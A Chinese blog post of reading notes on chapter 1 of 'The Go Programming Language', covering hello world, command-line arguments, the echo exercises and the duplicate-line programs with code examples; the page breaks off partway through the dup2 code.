<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>《Go语言圣经》第一章 - 读书笔记 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="《Go语言圣经》第一章 - 读书笔记" />
<meta property="og:description" content="《Go语言圣经》第一章 - 读书笔记 第一章 Go语言入门01 Hello World02 命令行参数练习练习1.1练习1.2：练习1.3： 03 查找重复的行例子运行dup1dup2dup3 练习练习1.4： 04 GIF 动画练习练习1.5：练习1.6： 05 获取URL练习练习1.7：练习1.8：练习1.9： 06 并发获取多个URL练习练习1.10：练习1.11： 07 Web服务练习练习1.12： 08 本章要点控制流命名类型指针方法和接口包（packages）注释 第一章 Go语言入门 01 Hello World Go 是一门编译型语言（静态编译），Go语言的工具链将源代码及其依赖转换成计算机的机器指令
Go 语言提供的工具都通过一个单独的命令 go 调用
go 命令有一系列子命令，最简单的一个子命令就是 run，该命令编译一个或多个以 .go 结尾的源文件，链接库文件，并运行最终生成的可执行文件build 子命令可以生成一个可执行的二进制文件，该编译结果可长期保存，之后可以随时运行它 注意：
1、Windows系统下生成的可执行文件是 helloworld.exe，增加了 .exe 后缀名
2、Windows系统下在命令行可以直接输入helloworld.exe命令运行
3、go build 生成的可执行文件是静态编译，不需要担心在系统库更新的时候会冲突
4、静态编译和动态编译的区别
① 静态编译
编译器在编译可执行文件时，把需要用到的对应的动态链接库（.so 或 .lib）中的部分提取出来，链接到可执行文件中，是可执行文件在运行时不需要依赖于动态链接库
② 动态编译
动态编译的可执行文件需要附带一个的动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以其优点有：
缩小了执行文件本身的体积
加快了编译速度，节省了系统资源
其缺点有：
即使是很简单的程序只用到了链接库中的一两条命令，也需要附带一个相对庞大的链接库如果其他计算机上没有安装对应的运行库，则用动态编译的可执行文件就不能运行 Go 语言原生支持 Unicode，它可以处理全世界任何语言的文本
举例：
package main import &#34;fmt&#34; func main() { fmt." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/c6af763ecc1f465a3e0bbad2ab2cfa77/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-16T17:23:51+08:00" />
<meta property="article:modified_time" content="2022-02-16T17:23:51+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">《Go语言圣经》第一章 - 读书笔记</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>《Go语言圣经》第一章 - 读书笔记</h4> 
 <ul><li><a href="#_Go_1" rel="nofollow">第一章 Go语言入门</a></li><li><ul><li><a href="#01_Hello_World_3" rel="nofollow">01 Hello World</a></li><li><a href="#02__86" rel="nofollow">02 命令行参数</a></li><li><ul><li><a href="#_178" rel="nofollow">练习</a></li><li><ul><li><a href="#11_201" rel="nofollow">练习1.1</a></li><li><a href="#12_210" rel="nofollow">练习1.2：</a></li><li><a href="#13_257" rel="nofollow">练习1.3：</a></li></ul> 
   </li></ul> 
   </li><li><a href="#03__262" rel="nofollow">03 查找重复的行</a></li><li><ul><li><a href="#_324" rel="nofollow">例子运行</a></li><li><ul><li><a href="#dup1_326" rel="nofollow">dup1</a></li><li><a href="#dup2_361" rel="nofollow">dup2</a></li><li><a href="#dup3_410" rel="nofollow">dup3</a></li></ul> 
    </li><li><a href="#_445" rel="nofollow">练习</a></li><li><ul><li><a href="#14_447" rel="nofollow">练习1.4：</a></li></ul> 
   </li></ul> 
   </li><li><a href="#04_GIF__508" rel="nofollow">04 GIF 动画</a></li><li><ul><li><a href="#_584" rel="nofollow">练习</a></li><li><ul><li><a href="#15_586" rel="nofollow">练习1.5：</a></li><li><a href="#16_594" rel="nofollow">练习1.6：</a></li></ul> 
   </li></ul> 
   </li><li><a href="#05_URL_663" rel="nofollow">05 获取URL</a></li><li><ul><li><a href="#_698" rel="nofollow">练习</a></li><li><ul><li><a href="#17_700" rel="nofollow">练习1.7：</a></li><li><a href="#18_733" rel="nofollow">练习1.8：</a></li><li><a href="#19_769" rel="nofollow">练习1.9：</a></li></ul> 
   </li></ul> 
   </li><li><a href="#06_URL_793" rel="nofollow">06 并发获取多个URL</a></li><li><ul><li><a href="#_843" rel="nofollow">练习</a></li><li><ul><li><a href="#110_845" rel="nofollow">练习1.10：</a></li><li><a href="#111_892" rel="nofollow">练习1.11：</a></li></ul> 
   </li></ul> 
   </li><li><a href="#07_Web_895" rel="nofollow">07 Web服务</a></li><li><ul><li><a href="#_1006" rel="nofollow">练习</a></li><li><ul><li><a href="#112_1008" rel="nofollow">练习1.12：</a></li></ul> 
   </li></ul> 
   </li><li><a href="#08__1102" rel="nofollow">08 本章要点</a></li><li><ul><li><a href="#_1104" rel="nofollow">控制流</a></li><li><a href="#_1142" rel="nofollow">命名类型</a></li><li><a href="#_1152" rel="nofollow">指针</a></li><li><a href="#_1159" rel="nofollow">方法和接口</a></li><li><a href="#packages_1165" rel="nofollow">包（packages）</a></li><li><a href="#_1173" rel="nofollow">注释</a></li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="_Go_1"></a>第一章 Go语言入门</h2> 
<h3><a id="01_Hello_World_3"></a>01 Hello World</h3> 
<ul><li> <p>Go 是一门编译型语言（静态编译），Go语言的工具链将源代码及其依赖转换成计算机的机器指令</p> </li><li> <p>Go 语言提供的工具都通过一个单独的命令 <code>go</code> 调用</p> 
  <ul><li><code>go</code> 命令有一系列子命令，最简单的一个子命令就是 <code>run</code>，该命令编译一个或多个以 <code>.go</code> 结尾的源文件，链接库文件，并运行最终生成的可执行文件</li><li><code>build</code> 子命令可以生成一个可执行的二进制文件，该编译结果可长期保存，之后可以随时运行它</li></ul> 
  <blockquote> 
   <p>注意：</p> 
   <p>1、Windows系统下生成的可执行文件是 helloworld.exe，增加了 .exe 后缀名</p> 
   <p>2、Windows系统下在命令行可以直接输入helloworld.exe命令运行</p> 
   <p>3、<code>go build</code> 生成的可执行文件是静态编译，不需要担心在系统库更新的时候会冲突</p> 
   <p><a href="https://www.cnblogs.com/lisuyun/p/3953589.html" rel="nofollow">4、静态编译和动态编译的区别</a></p> 
   <p>① 静态编译</p> 
   <p>编译器在编译可执行文件时，把需要用到的对应的动态链接库（.so 或 .lib）中的部分提取出来，链接到可执行文件中，是可执行文件在运行时不需要依赖于动态链接库</p> 
   <p>② 动态编译</p> 
   <p>动态编译的可执行文件需要附带一个的动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以其优点有：</p> 
   <ul><li> <p>缩小了执行文件本身的体积</p> </li><li> <p>加快了编译速度，节省了系统资源</p> </li></ul> 
   <p>其缺点有：</p> 
   <ul><li>即使是很简单的程序只用到了链接库中的一两条命令，也需要附带一个相对庞大的链接库</li><li>如果其他计算机上没有安装对应的运行库，则用动态编译的可执行文件就不能运行</li></ul> 
  </blockquote> </li><li> <p>Go 语言原生支持 Unicode，它可以处理全世界任何语言的文本</p> </li></ul> 
<blockquote> 
 <p>举例：</p> 
 <pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
 <p><img src="https://images2.imgbox.com/70/c5/CD3hvHxc_o.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-2SzGmY09-1645002079788)(E:\Typora笔记\Golang学习\Golang基础\images\Untitled\image-20220207103042660.png)]"></p> 
 <p><img src="https://images2.imgbox.com/53/09/aOzlnCcO_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/fe/69/vZg00tny_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<ul><li> <p>Go 语言的代码通过**包(package)**组织，包类似于其它语言里的库(libraries)或者模块(modules)</p> </li><li> <p>一个包由位于单个目录下的一个或多个.go 源码文件组成，目录定义包的作用</p> </li><li> <p>每个源文件都以一条<code>package</code>声明语句开始，表示该文件属于哪个包，紧跟着一系列导入<code>import</code>的包，之后是存储在这个文件里的程序语句</p> </li><li> <p><code>main</code>包定义了一个独立可执行的程序，<code>main</code>包里的<code>main</code>函数是整个程序执行时的入口，<code>main</code>函数所做的事情就是程序做的，其一般是调用其它包里的函数完成很多工作</p> </li><li> <p>跟随在<code>package</code>声明之后的<code>import</code>声明作用就是告诉编译器源文件需要哪些包</p> </li><li> <p>必须恰当导入需要的包，缺少了必要的包或者导入了不需要的包，程序都无法编译通过。该项严格要求避免了程序开发过程中引入未使用的包</p> </li><li> <p>跟随在<code>import</code>声明之后的是组成程序的函数、变量、常量、类型的声明语句（分别由关键字<code>func</code>、<code>var</code>、<code>const</code>、<code>type</code>定义）</p> </li><li> <p>Go语言不需要再语句或者声明的末尾添加分号，除非一行上有多条语句</p> 
  <ul><li> <p>实际上，编译器会主动把特定符号后的换行符转换为分号，因此换行符添加的位置会影响Go代码的正确解析</p> </li><li> <p><code>gofmt</code>工具把代码格式化为标准格式</p> </li><li> <p><code>goimports</code>工具可以根据代码需要自动的添加或删除<code>import</code>声明</p> 
    <blockquote> 
     <p>可用以下安装命令：</p> 
     <pre><code class="prism language-go"><span class="token keyword">go</span> get golang<span class="token punctuation">.</span>org<span class="token operator">/</span>x<span class="token operator">/</span>tools<span class="token operator">/</span>cmd<span class="token operator">/</span>goimports
</code></pre> 
    </blockquote> </li></ul> </li></ul> 
<h3><a id="02__86"></a>02 命令行参数</h3> 
<ul><li> <p><code>os</code> 包以跨平台的方式，提供了一些与操作系统交互的函数和变量，程序的命令行参数可从OS包的Args变量获取；os包外部使用os.Args访问改变量</p> 
  <ul><li>os.Args变量是一个字符串的切片，其第一个元素 <code>os.Args[0]</code> 是命令本身的名字，其他的元素则是程序启动时传给它的参数</li></ul> </li><li> <p>Go 语言中的注释语句以 <code>//</code> 开头</p> </li><li> <p>按照惯例，我们在每个包的包声明前添加注释，对于<code>main package</code>，注释包含一句或几句话，从整体角度对程序做个描述</p> </li><li> <p>变量会在声明时直接初始化，如果变量没有显式初始化，则被隐式地赋予其类型的零值</p> </li><li> <p>Go 语言只有for循环一种循环语句。for循环有多种形式，其中一种如下所示：</p> 
  <blockquote> 
   <pre><code class="prism language-go"><span class="token keyword">for</span> initialization<span class="token punctuation">;</span> condition<span class="token punctuation">;</span> post<span class="token punctuation">{<!-- --></span>
<span class="token comment">// zero or more statements</span>
<span class="token punctuation">}</span>
</code></pre> 
   <ul><li> <p>for 循环三个部分不需要括号包围。大括号强制要求，左大括号必须和post语句在同一行</p> </li><li> <p>initialization语句是可选的，在循环开始前执行。initialization语句如果存在，必须是一条简单语句，即，短变量声明、自增语句、赋值语句或函数调用</p> </li><li> <p>for 循环的三个部分每个都可以省略</p> 
     <ul><li>如果省略 initialization 和 post，分号也可以省略：</li></ul> <pre><code class="prism language-go"><span class="token comment">// a traditional "while" loop</span>
<span class="token keyword">for</span> condition <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre> 
     <ul><li>如果连 condition 也省略就变成无限循环，可用 <code>break</code> 或 <code>return</code> 语句终止循环</li></ul> <pre><code class="prism language-go"><span class="token comment">// a traditional infinite loop</span>
<span class="token keyword">for</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre> </li><li> <p>for 循环的另外一种形式是在某种类型的区间（range）上遍历，如字符串或切片</p> <pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	s<span class="token punctuation">,</span> sep <span class="token operator">:=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span>
	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> arg <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		s <span class="token operator">+=</span> sep <span class="token operator">+</span> arg
		sep <span class="token operator">=</span> <span class="token string">" "</span>
	<span class="token punctuation">}</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
     <ul><li>每次循环迭代，range 产生一对值：<strong><code>索引</code><strong>以及</strong><code>在该索引处的元素值</code></strong>，range 的语法要求是要处理元素就必须处理索引，如果索引无用处，Go语言的解决方法是使用**<code>空标识符</code>**，即 <code>_</code></li><li>空标识符可用于在任何语法需要变量名但程序逻辑不需要的时候，如在循环里丢弃不需要的循环索引，并保留元素值</li></ul> </li></ul> 
  </blockquote> </li><li> <p>变量声明的方式：</p> 
  <blockquote> 
   <p><strong>①</strong> <code>s := ""</code><br> <strong>②</strong> <code>var s string</code><br> <strong>③</strong> <code>var s = ""</code><br> <strong>④</strong> <code>var s string = ""</code></p> 
   <p>第 ① 种是短变量声明，最简洁，但只能用在函数内部，而不能用于包变量</p> 
   <p>第 ② 种形式依赖于字符串的默认初始化零值机制，被初始化为 “”</p> 
   <p>第 ③ 种形式用的很少，除非同时声明多个变量</p> 
   <p>第 ④ 种显式的标明变量的类型，当变量类型与初值类型相同时，类型冗余，但如果两者类型不同，变量类型就必须了</p> 
   <p>具体实践中一般使用 ① ②两种，初始值重要的话就显式的指定变量类型，否则使用隐式初始化</p> 
  </blockquote> </li><li> <p>使用 <code>strings</code> 包的 <code>Join</code> 函数拼接字符串：</p> <pre><code class="prism language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> </li></ul> 
<h4><a id="_178"></a>练习</h4> 
<p><strong>echo 程序</strong></p> 
<pre><code class="prism language-go"><span class="token comment">// Echo1 prints its command-line arguments.</span>
<span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">var</span> s<span class="token punctuation">,</span> sep <span class="token builtin">string</span>
    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
        s <span class="token operator">+=</span> sep <span class="token operator">+</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        sep <span class="token operator">=</span> <span class="token string">" "</span>
    <span class="token punctuation">}</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="11_201"></a>练习1.1</h5> 
<blockquote> 
 <p>修改 <code>echo</code> 程序，使其能够打印 <code>os.Args[0]</code>，即被执行命令本身的名字</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="12_210"></a>练习1.2：</h5> 
<blockquote> 
 <p>修改 <code>echo</code> 程序，使其打印每个参数的索引和值，每个一行</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	s<span class="token punctuation">,</span> sep <span class="token operator">:=</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span>
	<span class="token keyword">for</span> index<span class="token punctuation">,</span> arg <span class="token operator">:=</span> <span class="token keyword">range</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token punctuation">{<!-- --></span>
		s <span class="token operator">+=</span> sep <span class="token operator">+</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> arg
		sep <span class="token operator">=</span> <span class="token string">"\n"</span>
	<span class="token punctuation">}</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<ul><li> <p>Go 语言中 int 类型转 string 类型的方法：</p> <pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"strconv"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> i <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">10</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// ① 通过 Itoa 方法转换</span>
	str1 <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

	<span class="token comment">// ② 通过 Sprintf 方法转换 %d代表Integer</span>
	str2 <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>

	<span class="token comment">// 打印str1</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>
	<span class="token comment">// 打印str2</span>
	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> </li></ul> 
<h5><a id="13_257"></a>练习1.3：</h5> 
<blockquote> 
 <p>做实验测量潜在低效的版本和使用了 <code>strings.Join</code> 的版本的运行时间差异</p> 
</blockquote> 
<h3><a id="03__262"></a>03 查找重复的行</h3> 
<ul><li> <p>对文件做拷贝、打印、搜索、排序、统计或类似事情的程序都有一个差不多的程序结构：</p> 
  <ul><li>一个处理输入的循环</li><li>在每个元素上执行计算处理</li><li>在处理的同时或最后产生输出</li></ul> </li><li> <p>Go 语言的 <strong>map</strong> 存储了<code>键/值(key/value)</code>的集合，对集合元素提供常数时间的存、取或测试操作，其<strong>键key</strong>可以是任意类型，只要其<strong>值value</strong>能用 <code>==</code> 运算符比较即可，内置函数<code>make</code>创建空<code>map</code></p> <pre><code class="prism language-go"><span class="token comment">// map             key    value</span>
counts <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
</code></pre> 
  <ul><li>Go 的 map 类似于 Java 中的 HashMap、Python 中的 dict</li><li>map 的迭代顺序并不确定，从实践来看，该顺序随机，每次运行都会变化</li></ul> </li><li> <p>bufio 包可用来处理输入和输出，其中的 Scanner 类型可以读取输入并将其拆成行或单词，通常是处理行形式的输入最简单的方法</p> 
  <ul><li>创建 <code>bufio.Scanner</code> 类型的变量 <code>input</code> ，每次调用 <code>input.Scan()</code>，即读入下一行，并移除行末的换行符，其读取的内容可以调用 <code>input.Text()</code> 得到，<code>Scan</code> 函数在读到一行时返回 <code>true</code>，不再有输入时返回 <code>false</code></li></ul> </li><li> <p>程序读取数据的方式：</p> 
  <ul><li>从标准输入中读取数据，<code>os.Stdin</code> 指程序的标准输入</li><li>从一系列具名文件中读取数据，<code>os.Open</code> 打开各个具名文件，<code>os.Open</code> 函数返回两个值 
    <ul><li>第一个值是被打开的文件(<code>*os.File</code>)，其后被 <code>Scanner</code> 读取</li><li>第二个值是内置 <code>error</code> 类型的值，如果 <code>err</code> 等于内置值 <code>nil</code>(相当于其它语言里的NULL)，那么文件被成功打开；如果 <code>err</code> 的值不是 <code>nil</code>，说明打开文件时出错了</li></ul> </li></ul> </li><li> <p><code>fmt.Printf</code> 函数对一些表达式产生格式化输出，该函数的首个参数是格式字符串，用于指定后续参数被如何格式化，各个参数的格式取决于<strong>转换字符</strong>，其形式为百分号后跟一个字母，规范举例：</p> 
  <table><thead><tr><th align="center">转换字符</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">%d</td><td align="center">十进制整数</td></tr><tr><td align="center">%x，%o，%b</td><td align="center">十六进制，八进制，二进制整数</td></tr><tr><td align="center">%f，%g，%e</td><td align="center">浮点数：3.141593 3.141592653589793 3,141593e+00</td></tr><tr><td align="center">%t</td><td align="center">布尔：true 或 false</td></tr><tr><td align="center">%c</td><td align="center">字符（rune）（Unicode 代码点）</td></tr><tr><td align="center">%s</td><td align="center">字符串</td></tr><tr><td align="center">%q</td><td align="center">带双引号的字符串 “abc” 或带单引号的字符 ‘c’</td></tr><tr><td align="center">%v</td><td align="center">变量的自然形式（natural format）</td></tr><tr><td align="center">%T</td><td align="center">变量的类型</td></tr><tr><td align="center">%%</td><td align="center">字面上的百分号标志（无操作数）</td></tr></tbody></table> 
  <ul><li>转义字符：制表符 <code>\t</code>和换行符 <code>\n</code></li></ul> </li><li> <p>函数和包级别的变量可以任意顺序声明，并不影响其被调用，但最好还是遵循一定的规范</p> </li><li> <p><code>map</code> 是一个由 <code>make</code> 函数创建的数据结构的引用，<code>map</code> 作为参数传递给某函数时，该函数接受这个引用的一份拷贝，被调用函数对 <code>map</code> 底层数据结构的任何修改，调用者函数都可以通过持有的 <code>map</code> 引用看到，类似于C++里的引用传递，实际上指针是另一个指针了，但内部存的值指向同一块内存</p> </li><li> <p><code>dup</code>的前两个版本以"流”模式读取输入 ，并根据需要拆分成多个行。理论上，这些程序可以处理任意数量的输入数据</p> 
  <ul><li>另一个方法：一次性读取全部输入数据到内存中，然后一次分割为多行，再处理它们</li></ul> </li><li> <p><code>io/ioutil</code>包的<code>ReadFile</code>函数读取指定文件的全部内容，该函数返回一个字节切片（byte slice），必须将其转换为 string，才能用 strings.Split分割</p> </li><li> <p><code>strings.Split</code>函数把字符串分割成字串的切片</p> </li><li> <p><code>bufio.Scanner</code>、<code>ioutil.ReadFile</code>和<code>ioutil.WriteFile</code>都使用<code>*os.File</code>的<code>Read</code>和<code>Write</code>方法，但程序员很少需要直接调用低级函数，高级函数，像<code>bufio.Scanner</code>、<code>ioutil.ReadFile</code>包中所提供的那些，用起来要容易点</p> </li></ul> 
<h4><a id="_324"></a>例子运行</h4> 
<h5><a id="dup1_326"></a>dup1</h5> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bufio"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	counts <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
	<span class="token comment">// 测试读取标准输入使用 Ctrl+D 结束输入</span>
	input <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewScanner</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stdin<span class="token punctuation">)</span>
	<span class="token keyword">for</span> input<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		counts<span class="token punctuation">[</span>input<span class="token punctuation">.</span><span class="token function">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">++</span>
		<span class="token comment">// line := input.Text()</span>
		<span class="token comment">// counts[line] = counts[line]+1</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">for</span> line<span class="token punctuation">,</span> n <span class="token operator">:=</span> <span class="token keyword">range</span> counts <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">if</span> n <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token punctuation">{<!-- --></span>
			fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\t%s\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> line<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><strong>运行示例：</strong><br> <img src="https://images2.imgbox.com/a7/dd/akCuamu8_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="dup2_361"></a>dup2</h5> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bufio"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
<span class="token punctuation">)</span>

<span class="token comment">// Dup2 prints the count and text of lines that appear more than once</span>
<span class="token comment">// in the input. It reads from stdin or from a list of named files.</span>
<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
	counts <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span>
	files <span class="token operator">:=</span> os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">countLines</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stdin<span class="token punctuation">,</span> counts<span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> arg <span class="token operator">:=</span> <span class="token keyword">range</span> files <span class="token punctuation">{<!-- --></span>
			f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{<!-- --></span>
				fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Stderr<span class="token punctuation">,</span> <span class="token string">"dup2: %v\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
				<span class="token keyword">continue</span>
			<span class="token punctuation">}</span>
			<span class="token function">countLines</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> counts<span class="token punctuation">)</span>
			f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
